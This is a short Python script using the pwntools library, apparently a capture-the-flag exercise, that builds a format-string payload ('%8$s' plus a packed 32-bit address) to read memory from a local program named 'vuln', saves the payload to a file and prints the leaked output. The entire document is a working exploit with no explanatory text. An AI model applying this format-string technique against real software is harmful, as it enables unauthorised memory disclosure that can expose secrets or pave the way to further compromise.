from pwn import *
elf = context.binary = ELF("./vuln")
p = process()
payload = b"%8$saaaa" + p32(0x8048000)
write("payload",payload)
p.sendline(payload)
print(p.recvall())